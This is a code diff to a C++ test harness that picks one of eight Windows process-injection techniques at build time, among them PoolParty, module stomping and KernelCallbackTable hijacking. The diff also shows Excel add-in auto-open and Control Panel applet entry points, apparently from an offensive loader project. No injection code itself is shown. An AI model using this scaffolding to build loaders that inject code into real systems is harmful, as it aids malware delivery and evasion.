@@ -1,12 +1,16 @@
 /**
  * @file test_injection.cpp
  * @brief Test specific injection methods
- * 
+ *
  * Build with different CONFIG_INJECTION_TYPE values:
- *   make test-injection BUILD=debug INJECTION_TYPE=1  # NtMapViewOfSection
- *   make test-injection BUILD=debug INJECTION_TYPE=2  # CreateFiber
- *   make test-injection BUILD=debug INJECTION_TYPE=3  # EarlyCascade
- *   make test-injection BUILD=debug INJECTION_TYPE=4  # PoolParty
+ *   make test-injection INJECTION_TYPE=1  # NtMapViewOfSection   (remote)
+ *   make test-injection INJECTION_TYPE=2  # CreateFiber          (self)
+ *   make test-injection INJECTION_TYPE=3  # EarlyCascade         (remote)
+ *   make test-injection INJECTION_TYPE=4  # PoolParty            (remote)
+ *   make test-injection INJECTION_TYPE=5  # NtQueueApcThread     (remote)
+ *   make test-injection INJECTION_TYPE=6  # ModuleStomp          (self)
+ *   make test-injection INJECTION_TYPE=7  # KernelCallbackTable  (self)
+ *   make test-injection INJECTION_TYPE=8  # TxfHollow            (remote)
  */
 
 #include <cstdio>
@@ -47,13 +51,21 @@
 
 const char* GetInjectionMethodName() {
 #if CONFIG_INJECTION_TYPE == 1
-    return "NtMapViewOfSection (Section Mapping)";
+    return "NtMapViewOfSection (Section Mapping, Remote)";
 #elif CONFIG_INJECTION_TYPE == 2
-    return "CreateFiber (Fiber-based Self-Injection)";
+    return "CreateFiber (Fiber-based, Self)";
 #elif CONFIG_INJECTION_TYPE == 3
-    return "EarlyCascade (Early Bird APC)";
+    return "EarlyCascade (Early Bird APC, Remote)";
 #elif CONFIG_INJECTION_TYPE == 4
-    return "PoolParty (Worker Factory Thread Pool)";
+    return "PoolParty (Worker Factory Thread Pool, Remote)";
+#elif CONFIG_INJECTION_TYPE == 5
+    return "NtQueueApcThread (APC into existing thread, Remote)";
+#elif CONFIG_INJECTION_TYPE == 6
+    return "ModuleStomp (Legitimate DLL .text overwrite, Self)";
+#elif CONFIG_INJECTION_TYPE == 7
+    return "KernelCallbackTable (PEB KCT hijack via SendMessage, Self)";
+#elif CONFIG_INJECTION_TYPE == 8
+    return "TxfHollow (Transacted NTFS ghost section, Remote)";
 #else
     return "Unknown";
 #endif
@@ -219,37 +231,6 @@ extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void)
 extern "C" __declspec(dllexport) int WINAPI xlAutoClose(void)
 {
     return 1;
-}
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
-{
-    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
-    return TRUE;
-}
-
-#elif defined(BUILD_CPL)
-
-#define CPL_INIT     1
-#define CPL_GETCOUNT 2
-#define CPL_INQUIRE  3
-#define CPL_DBLCLK   5
-#define CPL_STOP     6
-#define CPL_EXIT     7
-
-extern "C" __declspec(dllexport) LONG CplApplet(HWND, UINT uMsg, LPARAM, LPARAM)
-{
-    switch (uMsg) {
-    case CPL_INIT:     return 1;
-    case CPL_GETCOUNT: return 1;
-    case CPL_INQUIRE:  return 0;
-    case CPL_DBLCLK: {
-        char stub[] = "test_injection_cpl";
-        char* argv[] = { stub, NULL };
-        main(1, argv);
-        return 0;
-    }
-    default: return 0;
-    }
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
